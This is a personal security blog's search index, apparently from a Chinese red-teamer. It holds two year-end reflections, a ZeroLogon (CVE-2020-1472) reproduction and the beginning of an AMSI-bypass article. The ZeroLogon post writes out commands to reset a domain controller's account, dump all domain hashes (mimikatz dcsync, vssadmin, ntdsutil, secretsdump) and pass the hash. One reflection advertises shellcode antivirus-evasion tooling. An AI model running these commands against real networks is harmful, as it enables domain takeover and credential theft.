<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>回首2021</title>
    <url>/2021/12/29/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>曾经看过一句话，说每个人的人生都有很艰难的一年用来改变自己。以前我不以为然，既觉得一年时间说的太具体又觉得一年有点短。但我真的经历了我相信了。真的是一年。</p>
<p>2021与过去的18年最大的不同大概就是踏上了安全这条路，如果没有学习安全的话，今年估计和以往也没什么不同。关于学习上的总结，在这里我不想多聊，的确已经写过不少东西了。那聊些什么呢？哎呀，随心吧，想到哪写到哪</p>
<h3 id="流水账"><a href="#流水账" class="headerlink" title="流水账"></a>流水账</h3><p>2021年初的时候，还是个网瘾少年，2个月的寒假，在家打了两个月的LOL，也想过改变下自己，不能这样颓废下去，看着周围人打acm，自己也去试着刷算法题，但是一点兴趣都提不起来，2个月的寒假就这么过去了。用一句话总结就是：间接性踌躇满志，持续性混吃等死。在二月底的时候了解到网络安全，尝试着去加各种群，努力融入这个圈子，自学了大概一个月，四月初的时候报了班系统学习。万事开头难，最难熬的无非就是最初的一个月，熬过去后就开始永无止境的学习路了，这个时候已经明白需要去学什么，对搜索引擎的使用也游刃有余。可以开始快乐的研究技术了。</p>
<p>再后来，在7月初的时候试着投了几家公司去实习，当时也没报希望，知道自己处在什么水平，但还是想着试一试嘛，非常有幸成都的一家公司给了我实习机会。虽然说是在职场，但小公司并不是我想象中的职场的样子。可能因为大家都是搞技术的，年龄相差也不大，相处的还算挺舒服，更像是一个团队的感觉。不到两个月的实习生活中，技术进步还算比较大，毕竟接触到的都是实战，很多东西网上都是找不到的。总结来说，非常棒的一次实习经历。再来说下成都，虽然呆了50天左右，但成都还有很多地方我没有去过，不能说了解很多，就整体印象而言，成都是比较适合生活的城市，节奏没有上海那么快，而且成都的安全公司很多，大佬云集，希望有机会可以再来成都，</p>
<p>9月初开学后，当时闹着玩，把简历改为大四，趁着秋招的风，投了几家校招，无一例外，全部凉凉。面试结果也在我意料之中，最初投校招的目的就是看看面试官会问哪些问题，我还缺什么技能。面试结束后，也反思了下自己，基础不牢，不仅仅是web漏洞的基础，还有计算机的基础，  包括从甲方的角度考虑安全问题，站在系统生态的高度看漏洞……这都是当时的我欠缺的，没事，还有时间，慢慢补嘛。</p>
<p>同时还试着投了一家校招实习生的岗位，当时看到招聘，也没想过结果，反正就试试嘛，也体验下大厂的面试感觉。面试前没有通知，电话打过来说是xx的面试官，说实话有点懵，以为简历直接丢了，当时距离投简历过了一周左右。一面很紧张，本来以为面了挺多次的了，应该可以很从容的应对，无奈啊，xx的威慑力太大了hhhhh，一面发挥不是很好。过了两天，二面面试官(我的导师)提前和我约了面试时间，也有了时间去准备，感觉比一面流畅了很多，但自身实力有限，二面结束后也没有报希望。直到第二天导师加了我的微信，让我在官网投简历时，才开始激动，这是，要拿到offer了吗？后面又走了一些流程（HR面），和一些其他原因，offer终于在国庆节后发到我的邮箱，此时距离二面已经过了20多天，最初的高兴激动也慢慢褪去，以至于拿到offer，比较平静hhhh（有点凡尔赛了……）。这里我并不认为是我技术很强，技术强的人大有人在，我是真心觉得我是幸运的。接着就是准备去入职，第一次去上海，第一次租房……因为一些原因，只在公司呆了一周就回学校了。体验了大厂的工作环境，氛围，可能和部门有关，也可能我只是个实习生，并没有感到网上说的“996福报”，大家都是在研究自己喜欢的技术（起码我是hhhh）。以后不知道是什么感觉，目前而言，工作是自己喜欢的内容，并能够从中得到满足，获得快乐，是一件很难得的事情。有了工作后才发现，有自己的时间是多么可贵，能用来学习自己的东西更加难得，hhh，感受到了在学校的好处。</p>
<p>这么早就去实习是对是错，我也说不清，有利有弊吧。以至于我记忆中在大学的校园生活片段很少，只有零星的滑板碎片和……好吧，基本就没了。大部分时间都宅在寝室，晚上出门散步或跑步或滑板，撸点铁。课堂生活没什么好聊的，大部分是不感兴趣或者说不合时宜的，少部分上课想听但也走神的……. 总结下来我是真的不适合上课。看到别人家大学的校园生活也会羡慕，但又有什么办法呢？酸两句得了，还是要接着做自己的事，还好生活足够充实，让我没有浪费时间做些无聊的事情。但总有些是要还的，5天考六门，谁考谁知道。12月的上半个月总算熬过来了。</p>
<h3 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h3><p>我是个不安分的人，总是幻想着四处去旅游，今年也算在慢慢实现。还体验了一个人旅游的感觉，感觉挺好的，自由。想过去西藏，去新疆，去川西…….我相信一定会去的，而且不会太远，如果能在20岁之前去一次那就更好了hhhhh。</p>
<p>整个2021对我的改变是非常大的，在各个方面。最直观的感受大概就是和以前的好朋友能聊的东西越来越少，emm 想很多后也能理解并接受。也偶尔唏嘘。朋友嘛，来来去去，习惯就好。现在也有可以除了谈技术也可以谈心的朋友，尽管不清楚能走多远，但能陪着走一段路就显得弥足珍贵。能想象到打开微信没有人可以聊是很难受的。</p>
<p>也有些遗憾，有些事情明明可以做的更好，但也没有什么后悔的，走些弯路也不见得是坏事，现在的结果也挺好的。</p>
<p>同时，也感受到了职场的残酷……</p>
<p>嗷对，有打算创建个团队。关于规模，以及怎么做都还没有详细的规划。但有一件事可以确定，技术分享为主，初步打算是每周的技术分享，大家都是因为热爱技术聚到一起的嘛。虽然我们几个都比较菜，距离大佬差距还很大hhhh，但可以一起进步嘛。如果你也希望进步，希望交流，有想法的话，可以留言或者发邮件或者加微信详谈，来白嫖就算了。目前也是只做了一个平台准备用来技术分享，暂时有shellcode一键免杀功能，过全球静态，简单上线没问题。这是目前大概的想法。</p>
<p><img src="/2021/12/29/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20211226215350141.png" alt="image-20211226215350141"></p>
<p><img src="/2021/12/29/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20211226215107150.png" alt="image-20211226215107150"></p>
<p>大概2021就是这样了，在我看来，也还算凑合，可以说的过去。希望大家的2022都可以更丰富多彩些，让枯燥普通的生活可以绚烂些，同时技术原地起飞，0day数不清，shell到手软。</p>
<p>如果用用几个词总结下我2021的主旋律，那大概就是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.幸运</span><br><span class="line">2.成长</span><br><span class="line">3.改变</span><br><span class="line">4.无畏</span><br></pre></td></tr></table></figure>

<p>Peace.</p>
]]></content>
      <categories>
        <category>个人总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>吹水</tag>
      </tags>
  </entry>
  <entry>
    <title>支离破碎的2022</title>
    <url>/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今年是大学的第三年，也是工作的第二年。像是坐在自然选择号上，按下了前进四的按钮，不知不觉间来到了年底。年终总结从去年开始后我便觉得是每年不可或缺的一部分，毕竟每年的变化这么大，尤其是今年，被疫情冲击的支离破碎，把今年记录下来是挺有意义的一件事情。</p>
<h1 id="something"><a href="#something" class="headerlink" title="something"></a>something</h1><p>在今年的前几个月除了过春节，加之上海的疫情，公司没什么项目，我处于比较闲的状态，每天就是学习学习学习，研究研究研究。运气比较好，在2月份回了学校，没有在上海最艰难的时候被困在上海。</p>
<h3 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h3><p>真正开始忙起来是从四月份的第一次出差开始，接下来的半年时间都在hw，所以这段时间的博客也没有更新。本来出差也是轮不到我的，但公司里的小伙伴不是被封在上海就是深圳，健康宝弹窗，而我从学校偷偷跑去了北京一星期hhhhh。从北京回来后北京的疫情也日趋严重，不得不感叹我的运气真好。</p>
<p>hw的时候是很有感觉的，是和大家一起并肩作战的感觉，当然不可避免的熬夜通宵。凌晨三四点睡觉六七点钟定个闹钟起床dump扫描结果，5点钟写完报告后安心去睡觉的时候仍历历在目。凌晨睡觉更是贯穿了全年始终，一方面是晚上效率更高，是对技术的渴求，另一方面是周围环境都是这种，自然是有不少压力。</p>
<p><img src="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20221210130110919.png" alt="image-20221210130110919"></p>
<p><img src="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20221210130129274.png" alt="image-20221210130129274"></p>
<p>今年的战斗月是5月和七八月。5月多线程不间断的小hw，七八月的大hw，对我而言是非常宝贵的一段财富，不仅是从实战中学到了很多技术，也拓宽了一些不局限于技术的知识。印象最深的还是7月底开始的大hw，这也是我第一次在现场和大家并肩作战，相比于以前一个人在学校的宿舍和大家远程沟通，大家一起坐在会议室里，交流更加方便直接，氛围很nice，也见识到了更nb的攻击手法。大家会在趁着目标的管理员吃午饭的时间rdp种🐎成功而欢呼雀跃，会在恰好截屏目标机器的2FA而激动不已，也有在距离演练结束还有10分钟的时候提权成功但是登陆VPN的账号失败的遗憾……这种氛围是在学校里孤军作战的感觉无法比的。也有听朋友说目标公司的员工因为被钓鱼而导致公司失分被扣了奖金，也挺难过的23333。</p>
<p>在打了这么多次hw后，也慢慢发现自己的两个短板。一是在于code的能力太差。恰好在打完大hw后，很长一段时间内没有其他的小hw，时间更多的被放在了提高code能力上。read，write，debug……如此往复。</p>
<p>二是基础不扎实。</p>
<p><img src="/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20221211144604823.png" alt="image-20221211144604823"></p>
<p>其实这些基础知识都已经反复学过挺多遍了，但一直没有记在脑子里，我想大概是没有用在实战中，一直在学习却没有实战中的利用，对我来说没有在实战中学习来的效率高。个人而言，学习了很长一段时间而没有实战，会有一点空虚的感觉，更像是一个云黑客。而这种感觉也让我对自己的定位更加清晰。学习研究是为了在实战中可以用到，实战可以找到学习研究中的不足。</p>
<h3 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h3><p>在学校的大部分时间都呆在宿舍。窝在宿舍里，坐在电脑前，从早到晚。所幸在顺利度过了大二整个学年，虽有挂科，但好在重修过了。感觉越上大学对大学的事情越不上心，遇到很多折磨的时候会告诉自己：这些明天就过去了。遇到棘手一点的会说：大不了明年重修。应该还会在学校呆一年，我的大学生活真的没有什么留恋的地方，上了3年，封了3年，可能明年会解封恢复正常，可我也没有大一的时间和精力到处去玩了。</p>
<p>我也想过为什么不喜欢在学校上课。不喜欢学习吗？答案当然是否定的。我很喜欢学习中的心流状态，crazy。但学校里的任务大都是疲于应付，不可能会有这种状态，应该不止我一个人这么认为。</p>
<p>不过虽然封校，今年也去了蛮多地方，往北到了哈尔滨，往南也去了西双版纳。和去年相比，今年不再是一个人旅游。虽然今年去了挺多地方，但是作为一个牛马，出去旅游没带电脑的时候，只有在大hw结束后在贵州的三四天，但却运气极差，在自驾3个多小时去草原的路上，在路上蹭到车没有第一时间报保险，到了草原的入口被通知遣返。我想我的lucky大概是离不开电脑的hhhhh。</p>
<p>不知不觉间今年已经是工作的第二年，最开始没有想到一份实习从去年到今年已经400多天。今年明显感觉到了行业的不景气，在5月份进行了一次部门调整，从原来的白露团队迁入了科恩实验室，而之前白露的同事也因为各种原因无法并肩作战。在这一年多的实习中也会遇到工作的困难，很多当下搞不定的东西，多花点时间，也都处理的还行，搞定之后会发现自己进步了一点点。短暂的痛苦之后便是进步，毕竟，<strong>“当你感到痛苦的时候就是成长最快的时候”</strong>。随着时间一点点过去，焦虑也会上来，明年的秋招怎么去准备？城市的选择？自己的技术栈怎么去提升？我现在也没有想好，每个年龄段都有各自的迷茫吧。</p>
<p>因为长时间久坐，虽然体重没有上升，却感觉到肚子上的赘肉越来越多。从10月份开始，坚持健身已经3个月，能明显感觉到身体的变化，身体的线条也渐渐的肉眼可见。希望可以作为一个习惯坚持下去。</p>
<p>总会听到说，今年就这样了，明年再说吧，起初是听别人说，现在自己也会这样，其实是一种逃避。希望可以慢慢改掉这个坏习惯，想去做什么就去做，不要给自己留退路。</p>
<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><ul>
<li>坚持健身</li>
<li>c#，go的编程能力</li>
<li>巩固基础</li>
<li>具备单兵能力</li>
<li>陪在身边的人还在</li>
</ul>
]]></content>
      <categories>
        <category>个人总结</category>
      </categories>
      <tags>
        <tag>年终总结</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-1472的分析与复现</title>
    <url>/2021/11/22/CVE-2020-1472/</url>
    <content><![CDATA[<h2 id="0x01-原理简介"><a href="#0x01-原理简介" class="headerlink" title="0x01 原理简介"></a>0x01 原理简介</h2><p>Netlogon远程协议（也称为MS-NRPC）是一个WIndows域控上使用的远程进程调用（RPC）接口，仅由连接到域的设备使用。 MS-NRPC包括身份验证方法和建立Netlogon安全通道的方法。这些更新强制指定的Netlogon客户端行为，以便在成员计算机和Active Directory (AD)域控制器(DC)之间使用带有Netlogon安全通道的安全RPC。最常用于让用户使用 NTLM 协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码。</p>
<p>ZeroLogon (CVE-2020-1472) 影响域内登录认证协议Netlogon (MS-NRPC) 中所使用的加密身份验证方案 (AES-CFB8)，在通过NetLogon协议与AD域控建立安全通道（RPC）时，强行登录尝试，对全零的纯文本应用AES-CFB8加密将导致全零的密文，从而可以绕过正常认证，进一步可获取域管理员HASH，获取域管权限 。</p>
<p>AES-CFB8的工作原理是，通过在明文前面添加一个16字节的初始化矢量（IV），然后将AES应用于IV和明文的前16个字节，并采用AES输出的第一个字节，来加密明文的每个字节，然后将其与下一个纯文本字节进行异或。</p>
<p>利用身份验证协议的方法是强行登录尝试。对于256个密钥中的1个，对全零的纯文本应用AESCFB8加密将导致全零的密文，从而启用登录绕过，这就是名称zerologon的来源。</p>
<p>使用NetrServerPasswordSet2方法，可以为客户端创建一个新密码，该密码可以使用AES-CFB8用会话密钥进行加密。 Netlogon纯文本密码由516个字节组成，后四个表示密码长度。通过提供516个零，它将被解密为516个零或一个空密码。以这种方式更改密码只能在AD中进行更新。</p>
<p>[<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81">MS-NRPC]： 网络服务器密码集 2 （运营 30） |微软文档 (microsoft.com)</a></p>
<p>大部分漏洞利用代码的工作原理是，向netlogon通道发送带有多个空字节的身份验证请求，然后发送一个零的密码文本和用于身份验证的质询标志</p>
<h2 id="0x02-ntds-dit"><a href="#0x02-ntds-dit" class="headerlink" title="0x02 ntds.dit"></a>0x02 ntds.dit</h2><p>那什么又是ntds.dit?</p>
<p>Ntds.dit文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的 <code>%SystemRoot%\ntds\ntds.dit</code>，活动目录始终会访问这个文件，所以文件禁止被读取。Ntds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p>
<p>而在非域环境也就是在工作组环境中，用户的密码等信息存储在SAM文件，想要破解SAM文件与Ntds.dit文件都需要拥有一个System文件。和SAM文件一样，Ntds.dit是默认被Windows系统锁定的。这也是使用mimikatz经常需要导出的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntds.dit文件位置: C:\Windows\NTDS\NTDS.dit</span><br><span class="line">system文件位置:C:\Windows\System32\config\SYSTEM</span><br><span class="line">sam文件位置:C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>

<p>导出该文件的方法也是有多种</p>
<h4 id="mimikatz-dcsync"><a href="#mimikatz-dcsync" class="headerlink" title="mimikatz-dcsync"></a>mimikatz-dcsync</h4><p>前提:高权限</p>
<p>Mimikatz有一个功能（dcsync），它可以利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.mimikatz lsadump::dcsync /domain:redteam.com /all /csv  		//可以通过dcsync直接获取test域内所有用户hash</span><br><span class="line">2.mimikatz lsadump::dcsync /domain:redteam.com /user:admin		//获取单个用户的详细信息</span><br><span class="line">3.mimikatz lsadump::lsa /inject									//查看所有用户的所有详细信息</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/22/CVE-2020-1472/image-20211112004131013.png" alt="image-20211112004131013"></p>
<p>这里报了个错…….估计是环境原因</p>
<p><img src="/2021/11/22/CVE-2020-1472/image-20211112004846754.png" alt="image-20211112004846754"></p>
<p><img src="/2021/11/22/CVE-2020-1472/image-20211112004353485.png" alt="image-20211112004353485"></p>
<h4 id="vssadmin卷影拷贝"><a href="#vssadmin卷影拷贝" class="headerlink" title="vssadmin卷影拷贝"></a>vssadmin卷影拷贝</h4><p>vssadmin是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息，显示已安装的所有卷影拷贝写入程序和提供程序，以及改变卷影拷贝的存储空间的大小等。</p>
<p>适用机器：Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</p>
<p>参考链接: <a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/vssadmin">vssadmin | Microsoft Docs</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.vssadmin create shadow /for=C:								//创建c盘卷影拷贝</span><br><span class="line">2.copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit		//在创建的卷影拷贝中将ntds.dit复制到C盘</span><br><span class="line">3.vssadmin delete shadows /for=c: /quiet						//删除</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/22/CVE-2020-1472/image-20211112005623582.png" alt="image-20211112005623582"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制sam或者system文件：</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hiv</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hiv</span><br></pre></td></tr></table></figure>



<h4 id="ntdsutil-exe"><a href="#ntdsutil-exe" class="headerlink" title="ntdsutil.exe"></a>ntdsutil.exe</h4><p>Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具，该工具被默认安装在了域控制器上，可以在域控上直接操作，也可以通过域内机器在域控上远程操作，但是需要管理员权限。使⽤ ntdsutil.exe，可以维护和管理活动⽬录数据<br>库、控制单个主机操作、创建应⽤程序⽬录分区、删除由未使⽤活动⽬录安装向导（DCPromo.exe）成功降级的<br>与控制器留下的元数据等。</p>
<ol>
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit   //首先建立快照，该快照包含Windows中的所有文件，且在复制时不会受到Windows锁定机制的影响</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/22/CVE-2020-1472/image-20211112011847351.png" alt="image-20211112011847351"></p>
<p>创建了一个名为 <code>de5c45d4-a705-46ec-96be-2cea86441410</code>的快照</p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;ID&#125;&quot; quit quit	  		//加载刚刚的快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;de5c45d4-a705-46ec-96be-2cea86441410&#125;&quot; quit quit	</span><br></pre></td></tr></table></figure>



<p><img src="/2021/11/22/CVE-2020-1472/image-20211112012438868.png" alt="image-20211112012438868"></p>
<p>3.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy C:\$SNAP_202111120118_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit  </span><br></pre></td></tr></table></figure>



<p><img src="/2021/11/22/CVE-2020-1472/image-20211112012707478.png" alt="image-20211112012707478"></p>
<p>//将快照中的ntds.dit拷贝到c盘</p>
<p>4.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;de5c45d4-a705-46ec-96be-2cea86441410&#125;&quot; &quot;delete &#123;de5c45d4-a705-46ec-96be-2cea86441410&#125;&quot; quit quit		</span><br></pre></td></tr></table></figure>

<p>//删除刚才创建的快照</p>
<p><img src="/2021/11/22/CVE-2020-1472/image-20211112012835669.png" alt="image-20211112012835669"></p>
<p>除了利用上面那种操作来获取ntds.dit外，还可以利用Ntdsutil.exe创建媒体安装集(IFM)来用于提取NTDS.dit文件。<strong>在使用ntdsutil创建创建媒体安装集(IFM)时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，我们可以利用该过程获取NTDS.dit文件，需要管理员权限。</strong></p>
<p>Ntdsutil是本地处理 Active Directory 的命令实用程序，并为DCPromo启用IFM集创建。IFM与DCPromo一起用于“从媒体安装”，因此被升级的服务器不需要通过网络从另一个DC复制域数据。</p>
<p>当创建一个IFM时，VSS快照会被自动拍摄，挂载，NTDS.DIT文件和相关数据被复制到目标文件夹中。</p>
<p>在域控制器中执行如下命令即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntdsutil &quot;activate instance ntds&quot; Ifm &quot;create full C:\ntdsutil&quot; Quit quit		//生成文件</span><br><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\ntdsutil&quot; q q			//简洁版 </span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/22/CVE-2020-1472/image-20211112011046874.png" alt="image-20211112011046874"></p>
<p>文件夹里保存着需要的文件</p>
<p><img src="/2021/11/22/CVE-2020-1472/image-20211112011320904.png" alt="image-20211112011320904"></p>
<p><img src="/2021/11/22/CVE-2020-1472/image-20211112011331512.png" alt="image-20211112011331512"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>当然获取ntds.dit的方法还有很多，有很多工具和脚本，这里就不一一细说了，本来只打算复现下 zerologon ，扯远了</p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>影响系统版本：该 Win2008 后的所有版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure>



<p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者只需要定位域控主机名及IP，并且可以访问域控，就可以在无需任何凭据的情况下拿到域管理员的权限，甚至不需要在域内</span><br></pre></td></tr></table></figure>

<p><strong>注意：域控的机器帐户HASH存储在注册表中，系统启动时会将其加载到lsass，当攻击置空域控HASH后，仅AD (NTDS.DIT) 中的密码会更改，而不是注册表或加载到lsass中的密码，域控存储在域中的凭证与本地的注册表/lsass中的凭证不一致时，这样将会导致域控脱域，无法使用Kerberos进行身份验证，因此要尽快恢复。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.python cve-2020-1472-exploit.py ad-2012 10.0.0.12 						//使用脚本将域控机器账户重置</span><br><span class="line"></span><br><span class="line">2.python secretsdump.py test.com/ad-2012$@10.0.0.12    -no-pass		//使用dcsync导出域内所有凭证</span><br><span class="line"></span><br><span class="line">3.python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7</span><br><span class="line">test.com/Administrator@10.0.0.12									//利用wmic进行hash传递</span><br><span class="line"></span><br><span class="line">4.导出 sam system 等⽂件到本地 用于恢复</span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line"></span><br><span class="line">5..删除文件</span><br><span class="line">del /f system.save</span><br><span class="line">del /f sam.save</span><br><span class="line">del /f security.save</span><br><span class="line"></span><br><span class="line">6.python secretsdump.py -sam sam.save -system system.save -security security.save</span><br><span class="line">LOCAL															//破解原域控机器上得hash值，用于恢复密码</span><br><span class="line"></span><br><span class="line">7.python reinstall_original_pw.py ad-2012 10.0.0.12 9c786d87f82b46071818e5bda3a9faab </span><br><span class="line">																//恢复密码</span><br><span class="line">																</span><br></pre></td></tr></table></figure>

<p>环境出了点问题，这里的图自行脑补</p>
<p><a href="https://cloud.tencent.com/developer/article/1727748">ZeroLogon(CVE-2020-1472) 分析与狩猎 - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p><a href="https://blog.csdn.net/Captain_RB/article/details/120643838">(31条消息) ZeroLogon (CVE-2020-1472) 漏洞利用_Captain_RB的博客-CSDN博客</a></p>
<p><a href="https://www.freebuf.com/articles/network/251267.html">内网渗透测试：从NTDS.dit获取域散列值 - FreeBuf网络安全行业门户</a></p>
<p>挖个坑，改日来补~</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>How to Bypass AMSI</title>
    <url>/2022/01/23/AMSI/</url>
    <content><![CDATA[<h2 id="关于AMSI"><a href="#关于AMSI" class="headerlink" title="关于AMSI"></a>关于AMSI</h2><p>当用户执行脚本或启动 PowerShell 时，AMSI.dll 被动态加载进入内存空间。在执行之前，防病毒软件使用以下两个 API 来扫描缓冲区和字符串以查找恶意软件的迹象。<br>  AmsiScanBuffer()<br>  AmsiScanString()</p>
<p>amsi只是一个通道，真正检测出是否是恶意脚本的是杀软，比如defender，amsi和杀软的区别在于无论我们的恶意脚本是经过多次模糊处理还是远程执行，amsi都可以在脚本注入内存前检测到。而普通的静态杀毒软件是没办法的。</p>
<p>其实不难理解，首先我们要知道我们的恶意脚本是如何注入内存执行的<br>bypass 杀毒软件时我们的脚本一定是模糊处理的，但是无论我们什么样模糊处理到注入内存执行的时候一定是纯净，清晰的代码，不然脚本引擎无法理解和执行我们的恶意脚本。那么问题就是在这里，amsi在脚本解密到注入内存之前去扫描查杀。这才是调用amsi的意义。</p>
<p>​    </p>
<p>amsi是所有杀毒软件都可以调用吗？并不是！<br>amsi是在Windows 10 和Windows Server 2016 之后才有的，然后并不是所有的杀毒软件都可以调用amsi接口。国内的基本都不可以。<br>在github上有一个项目记录了可以调用amsi的杀毒软件</p>
<p><a href="https://github.com/subat0mik/whoamsi/">https://github.com/subat0mik/whoamsi/</a></p>
<p>查看amsi中的查杀结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-WinEvent &#x27;microssoft-windows-windows defender/operational&#x27; | Where-Object id -EQ 1116 | format-list</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/23/AMSI/image-20220104002756500.png" alt="image-20220104002756500"></p>
<h3 id="AMSI的调用"><a href="#AMSI的调用" class="headerlink" title="AMSI的调用"></a>AMSI的调用</h3><p>下图为AMSI的扫描过程</p>
<p><img src="/AMSI/image-20220110210452843.png" alt="image-20220110210452843"></p>
<p>可以成为Windows的组件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.用户账户控制，也就是UAC（EXE、COM、MSI、ActiveX的安装） </span><br><span class="line">	%windir%\System32\consent.exe</span><br><span class="line">2.Powershell（脚本、交互式使用、动态代码求值）</span><br><span class="line">	System.Management.Automation.dll</span><br><span class="line">3.Windows脚本宿主</span><br><span class="line">    wscript.exe</span><br><span class="line">    cscript.exe</span><br><span class="line">4.JavaScript、VBScript</span><br><span class="line">    %windir%\System32\jscript.dll</span><br><span class="line">    %windir%\System32\vbscript.dll</span><br><span class="line">5.Office VBA macros(宏)</span><br><span class="line">	VBE7.dll</span><br><span class="line">6 .NET Assembly</span><br><span class="line">	clr.dll</span><br><span class="line">7.WMI</span><br><span class="line">	%windir%\System32\wbem\fastprox.dll</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>　</p>
<h2 id="主流对抗"><a href="#主流对抗" class="headerlink" title="主流对抗"></a>主流对抗</h2><h3 id="1-降级"><a href="#1-降级" class="headerlink" title="1.降级"></a>1.降级</h3><p>因为低版本(2.0)的powershell是没有amsi的，所以在powershell2.0上执行恶意脚本就不会被检测到</p>
<p>下图是powershell在各个系统上的预装情况，可以看到现在常见的win10、Windows 2016、2019很少预装有powershell2.0（amsi是从win10、2016开始存在的），但是由于很多服务需要低版本的powershell，所以在红蓝对抗中也会碰到装有powershell2.0 的机器。</p>
<p><img src="/2022/01/23/AMSI/image-20220103150817054.png" alt="image-20220103150817054"></p>
<p>查看当前powershell版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$PSVersionTable</span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/23/AMSI/image-20220103145525344.png" alt="image-20220103145525344"></p>
<p>判断能否使用powershell 2.0</p>
